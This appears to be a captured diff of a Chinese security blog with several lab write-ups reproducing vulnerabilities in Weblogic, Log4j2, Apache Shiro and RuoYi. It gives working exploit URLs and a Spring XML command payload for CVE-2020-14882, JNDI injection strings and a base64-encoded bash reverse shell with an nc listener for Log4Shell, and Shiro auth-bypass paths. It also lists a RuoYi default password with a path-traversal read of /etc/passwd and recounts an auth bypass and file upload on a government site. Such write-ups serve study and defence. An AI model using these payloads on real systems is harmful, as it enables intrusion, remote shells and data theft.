+              <time title="创建时间：2022-07-08 14:10:15" itemprop="dateCreated datePublished" datetime="2022-07-08T14:10:15+08:00">2022-07-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:29:04" itemprop="dateModified" datetime="2023-04-16T10:29:04+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6/" itemprop="url" rel="index"><span itemprop="name">中间件</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Weblogic-管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）">1. Weblogic 管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）</h1><h2 id="漏洞原理">1.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883 允许后台任意用户通过 HTTP 协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个 GET 请求在远程 Weblogic 服务器上以未授权的任意用户身份执行命令。</span><br></pre></td></tr></table></figure>
+
+<h2 id="影响版本">1.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Oracle Weblogic Server 10.3.6.0.0</span><br><span class="line">Oracle Weblogic Server 12.1.3.0.0</span><br><span class="line">Oracle Weblogic Server 12.2.1.3.0</span><br><span class="line">Oracle Weblogic Server 12.2.1.4.0</span><br><span class="line">Oracle Weblogic Server 14.1.1.0.0</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建">1.3. 环境搭建:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">攻击者: win11 192.168.179.1</span><br><span class="line">靶机: ubuntu 192.168.179.134	-- 需要安装vulhub靶场</span><br><span class="line"></span><br><span class="line">		靶机部署:</span><br><span class="line">		cd vulhub/weblogic/CVE-2020-14882</span><br><span class="line">		sudo docker-compose up -d	// 启动环境</span><br><span class="line">		启动完成后访问http://you-ip/7001/console，出现下图页面即部署成功</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/10/4TyiLb9rtsdxKSB.png" alt="image-20220710160918820"></p>
+<h2 id="漏洞复现">1.4. 漏洞复现:</h2><p><code>访问改目录 /console/css/%252e%252e%252fconsole.portal 可以跳过身份认证到管理后台</code></p>
+<p><img src="https://s2.loli.net/2022/07/10/vBpAEs4jxFDPZRH.png" alt="image-20220710162250812"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此时需要利用到第二个漏洞 CVE-2020-14883。有两种利用方法:</span><br><span class="line">一是通过 com.tangosol.coherence.mvel2.sh.ShellSession 类	 // 只能在Weblogic 12.2.1以上版本利用</span><br><span class="line">二是通过 com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext  // 全版本有效</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">方法一:</span><br><span class="line">http://192.168.179.134:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#x27;touch%20/tmp/success1&#x27;);&quot;)	// 访问该页面会返回404，但是会在tmp目录下创建success1文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/10/IrHpFMNOht2ygCS.png" alt="image-20220710164521172"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">方法二:</span><br><span class="line">http://192.168.179.134:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://192.168.179.1:8000/poc.xml&quot;)	// 然后通过该URL，即可让Weblogic加载这个XML，并执行其中的命令</span><br><span class="line"></span><br><span class="line">把poc.xml文件放入python3目录下，输入 python3 -m http.server // 开启本地 web 服务,poc.xml 代码如下</span><br><span class="line">访问上面网址，查看服务器目录 success2 文件已创建成功</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">   xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">   xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">          &lt;list&gt;</span><br><span class="line">            &lt;value&gt;bash&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;-c&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;&lt;![CDATA[touch /tmp/success2]]&gt;&lt;/value&gt;</span><br><span class="line">          &lt;/list&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/10/h9Kp4aUlkTXRN6d.png" alt="image-20220710171646759"></p>
+<p><img src="https://s2.loli.net/2022/07/10/AvpbTgytMsarhdY.png" alt="image-20220710172411404"></p>
+<h2 id="漏洞利用">1.5. 漏洞利用:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/zhzyker/exphub.git	// 下载 exphub</span><br><span class="line">选择其中的 cve-2020-14882_rce.py</span><br><span class="line">python3 cve-2020-14882_rce.py -u target_url -c whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/10/XQykKLblxs41MUh.png" alt="image-20220710170342678"></p>
+<h2 id="漏洞修复">1.6. 漏洞修复:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、及时下载官方补丁进行升级修复。下载地址如下：https://www.oracle.com/security-alerts/cpuoct2020.html。</span><br><span class="line">2、关闭后台/console/console.portal的访问权限。</span><br><span class="line">3、修改后台默认地址。</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/WEB%E6%A1%86%E6%9E%B6/Log4j2.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/WEB%E6%A1%86%E6%9E%B6/Log4j2.html" class="post-title-link" itemprop="url">Log4j2</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-07 18:14:49" itemprop="dateCreated datePublished" datetime="2022-07-07T18:14:49+08:00">2022-07-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 09:53:38" itemprop="dateModified" datetime="2023-04-16T09:53:38+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E6%A1%86%E6%9E%B6/" itemprop="url" rel="index"><span itemprop="name">WEB框架</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="log4shell（CVE-2021-44228）">1. log4shell（CVE-2021-44228）</h1><h2 id="漏洞原理：">1.1. 漏洞原理：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限</span><br></pre></td></tr></table></figure>
+
+<h2 id="影响版本：">1.2. 影响版本：</h2><p><code>Apache Log4j 2.x&lt;=2.14.1</code></p>
+<h2 id="环境搭建：">1.3. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">攻击者:kali 192.168.179.129</span><br><span class="line">靶机:ubuntu 192.168.179.130 // 需要安装vulhub环境</span><br><span class="line"></span><br><span class="line">		靶机部署:</span><br><span class="line">		cd vulhub/log4j/CVE-2021-44228/</span><br><span class="line">		sudo docker-compose up -d // 开启环境</span><br><span class="line">		访问靶机8983端口出现下图页面即部署完成</span><br><span class="line">		获取dnslog地址</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/iyeodAlMR9Qj8fV.png" alt="image-20220707145624994"></p>
+<p><code>点击Get SubDomain获取dnslog地址</code></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/tIgUMDQFmJezrRS.png" alt="image-20220707152759367"></p>
+<h2 id="漏洞复现：">1.4. 漏洞复现：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、寻找可以进行传递参数的注入点</span><br><span class="line">2、payload 2选1 </span><br><span class="line">	$&#123;jndi:ldap://$&#123;sys:java.version&#125;.xxx.dnslog.cn&#125;	// 获取java版本号</span><br><span class="line">	$&#123;jndi:rmi://$&#123;sys:java.version&#125;.xxx.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/4vOdCtMlHck9LNs.png" alt="image-20220707152948587"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/FMvI5wm1H8LrEZ4.png" alt="image-20220707155129468"></p>
+<h2 id="漏洞利用：">1.5. 漏洞利用：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar // 下载利用工具</span><br><span class="line">2、bash -i &gt;&amp; /dev/tcp/192.168.179.129/9999 0&gt;&amp;1 // poc，其中IP换成自己的,再进行base64加密，该语句不需要执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/YH7KeidZwUFjNWl.png" alt="image-20220707160722238"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3OS4xMjkvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 192.168.179.129 // 注意更换参数</span><br><span class="line"></span><br><span class="line">nc -lvvp 9999 // 开启监听</span><br><span class="line">红色箭头处选择一个利用代码，再次进行注入</span><br><span class="line">$&#123;jndi:rmi://192.168.179.129:1099/p1zao7&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/GLaZnUDuXmJOcBA.png" alt="image-20220707162044008"></p>
+<p><code>成功获取权限，利用结束</code></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/SreNMaHmdDu9Csq.png" alt="image-20220707164224941"></p>
+<h2 id="修复建议：">1.6. 修复建议：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、升级至安全版本Apache log4j-2.15.0-rc2</span><br><span class="line">2、JDK使用11.0.1、8u191、7u201、6u211及以上的高版本</span><br></pre></td></tr></table></figure>
+
+<h1 id="log4shell-bypass-（hw2022）">2. log4shell bypass （hw2022）</h1>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/WEB%E6%A1%86%E6%9E%B6/Shiro.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/WEB%E6%A1%86%E6%9E%B6/Shiro.html" class="post-title-link" itemprop="url">Shiro</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-06 18:14:49" itemprop="dateCreated datePublished" datetime="2022-07-06T18:14:49+08:00">2022-07-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:18:58" itemprop="dateModified" datetime="2023-04-16T10:18:58+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E6%A1%86%E6%9E%B6/" itemprop="url" rel="index"><span itemprop="name">WEB框架</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="shiro反序列化">1. shiro反序列化</h1><p>More info : 抓包查看请求包的cookie字段中是否包含remeberMe字段，存在则代表该网页使用的是shiro框架</p>
+<h2 id="shiro-550">1.1. shiro-550</h2><h3 id="漏洞原理：">1.1.1. 漏洞原理：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。</span><br></pre></td></tr></table></figure>
+
+<h3 id="影响版本：">1.1.2. 影响版本：</h3><p><code>Apache Shiro &lt; 1.2.4</code></p>
+<h3 id="环境搭建：">1.1.3. 环境搭建：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">攻击者:kali 192.168.179.129</span><br><span class="line">靶机:ubuntu 192.168.179.130 -- 需要安装vulhub</span><br><span class="line"></span><br><span class="line">		靶机部署:</span><br><span class="line">		下载安装vulhub，不会安装可以看unauth中的hadoop那篇文章</span><br><span class="line">		cd vulhub/shiro/CVE-2016-4437/</span><br><span class="line">		sudo docker-compose up -d // 启动环境</span><br><span class="line">		访问靶机8080端口页面如下即部署完成</span><br><span class="line">		sudo docker-compose down // 做完关闭靶机环境</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/07/HLhufiWJybSI9T8.png" alt="image-20220707093716391"></p>
+<h3 id="漏洞复现：">1.1.4. 漏洞复现：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里使用到了shiro_rce检测工具和railgun利用工具</span><br><span class="line">先使用shiro_rce工具检测key值</span><br><span class="line">再使用railgun工具进行命令执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/07/SQer1iDbEFmlNaA.png" alt="image-20220707112306178"></p>
+<p><img src="https://s2.loli.net/2022/07/07/F973B5D2tySpfXl.png" alt="image-20220707112355992"></p>
+<hr>
+<h2 id="shiro-721">1.2. shiro-721</h2><h3 id="漏洞原理：-1">1.2.1. 漏洞原理：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行</span><br></pre></td></tr></table></figure>
+
+<h3 id="影响版本：-1">1.2.2. 影响版本：</h3><p><code>Apache Shiro &lt; 1.4.2</code></p>
+<h3 id="漏洞利用：">1.2.3. 漏洞利用：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">条件:</span><br><span class="line">1. 登录目标网站，获取登录后的Cookie，因为需要有效cookie，且必须存在remember字段</span><br><span class="line">复现方法：</span><br><span class="line">使用railgun工具</span><br><span class="line">1. 将cookie完整的复制到cookie栏</span><br><span class="line">2. 选择yso gadget，并在命令栏写入对应命令</span><br><span class="line">3. 点击获取信息，即可根据gadget和cmd开始伪造cookie，最终会返回一个伪造后的cookie，使用该cookie发包请求即可造成反序列化攻击</span><br></pre></td></tr></table></figure>
+
+<h1 id="CVE-2020-1957-身份认证绕过">2. CVE-2020-1957(身份认证绕过)</h1><h2 id="漏洞原理：-2">2.1. 漏洞原理：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们请求的URL在整个项目的传入传递过程。在使用了shiro的项目中，是我们请求的URL(URL1),进过shiro权限检验(URL2), 最后到springboot项目找到路由来处理(URL3)</span><br><span class="line">漏洞的出现就在URL1,URL2和URL3 有可能不是同一个URL，这就导致我们能绕过shiro的校验，直接访问后端需要首选的URL</span><br></pre></td></tr></table></figure>
+
+<h2 id="影响版本：-2">2.2. 影响版本：</h2><p><code>Apache Shiro &lt; 1.5.3</code></p>
+<h2 id="环境搭建：-1">2.3. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">靶机:ubuntu 192.168.179.130</span><br><span class="line"></span><br><span class="line">		靶机部署:</span><br><span class="line">			cd vulhub/shiro/CVE-2020-1957/</span><br><span class="line">			sudo docker-compose up -d // 启动环境</span><br><span class="line">			访问到靶机8080端口，显示下图页面即部署成功</span><br><span class="line">			sudo docker-compose down // 做完关闭靶机环境</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/07/trdvbyQq24RmnFx.png" alt="image-20220707124311092"></p>
+<h2 id="漏洞复现：-1">2.4. 漏洞复现：</h2><p><code>正常情况访问点login登录是需要密码的，访问admin页面会重定向回登录页面</code></p>
+<p><img src="https://s2.loli.net/2022/07/07/HFuGYQUgpJ6hKyk.png" alt="image-20220707125124117"></p>
+<p><code>访问该目录/xxx/..;/admin/即可绕过登录验证</code></p>
+<p><img src="https://s2.loli.net/2022/07/07/e2hFoWxw3Il6VcX.png" alt="image-20220707124942061"></p>
+<h1 id="CVE-2020-11989-身份认证绕过">3. CVE-2020-11989(身份认证绕过)</h1><h2 id="漏洞描述：">3.1. 漏洞描述：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者可以通过/;/拼接后台地址或已知接口达到绕过身份验证的效果访问接口的效果。</span><br></pre></td></tr></table></figure>
+
+<h2 id="测试过程：">3.2. 测试过程：</h2><p>某次gov渗透测试时发现了shiro框架，测试之后发现并没有反序列化漏洞，JS中暴露的API接口也并不能访问，于是乎尝试使用身份认证绕过漏洞进行测试（因为shiro存在很多身份认证绕过漏洞）。</p>
+<ol>
+<li><p>首先访问任意目录，都会重定向回登录主页，使用<code>/;/111</code>进行测试发现返回404（表示客户端已经去访问这个文件，并且绕过了身份验证）。</p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416101041742.png" alt="image-20230416101041742"></p>
+</li>
+<li><p>通过<code>/;/</code>对之前收集API接口进行访问测试，果然是能够访问到的。</p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416101522105.png" alt="image-20230416101522105"></p>
+</li>
+<li><p>之前收集的一个upload上传接口，构造数据包尝试一下，上传成功了。</p>
+<p>这里开发忘记给&#x2F;files和文件名直接加&#x2F;了，导致我一直没访问到这个文件。后续测试另一个同样的站点的时候才发现，访问到文件的时候发现目录没有执行权限，是直接下载的。</p>
+</li>
+</ol>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416101711015.png" alt="image-20230416101711015"></p>
+<h1 id="CVE-2022-32532-身份认证绕过">4. CVE-2022-32532(身份认证绕过)</h1><h2 id="风险描述">4.1. 风险描述:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当 Apache Shiro 中使用 RegexRequestMatcher 进行权限配置，且正则表达式中携带“.”时，未经授权的远程攻击者可通过构造恶意数据包绕过身份认证。</span><br></pre></td></tr></table></figure>
+
+<h2 id="影响版本">4.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Shiro &lt; 1.9.1</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现">4.3. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过%0a,%0b绕过验证</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/CMS/RuoYi.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/CMS/RuoYi.html" class="post-title-link" itemprop="url">RuoYi</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-06 17:14:49" itemprop="dateCreated datePublished" datetime="2022-07-06T17:14:49+08:00">2022-07-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-07 13:43:56" itemprop="dateModified" datetime="2022-07-07T13:43:56+08:00">2022-07-07</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CMS/" itemprop="url" rel="index"><span itemprop="name">CMS</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="RuoYi后台默认口令-任意文件读取">0.0.1. RuoYi后台默认口令+任意文件读取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">有些情况访问若依后台时网页会已输入账号密码，通常情况为默认口令保存</span><br><span class="line">默认口令 admin/admin123</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/06/hYU6e14y8XOSlus.png"></p>
+<h4 id="漏洞利用：">0.0.1.1. 漏洞利用：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">登录到后台时可以尝试读取下面文件，不一定成功</span><br><span class="line">/common/download/resource?resource=/profile/../../../../etc/passwd // 读取passwd文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="Shiro反序列化">0.0.2. Shiro反序列化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">若依后台管理系统基于SpringBoot的权限管理系统 易读易懂、界面简洁美观。 核心技术采用Spring、MyBatis、Shiro。所以也可能存在Shiro反序列化</span><br><span class="line">可到iframe分类shiro中查看文章</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/%E6%95%B0%E6%8D%AE%E5%BA%93/Elasticsearch.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/%E6%95%B0%E6%8D%AE%E5%BA%93/Elasticsearch.html" class="post-title-link" itemprop="url">Elasticsearch</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
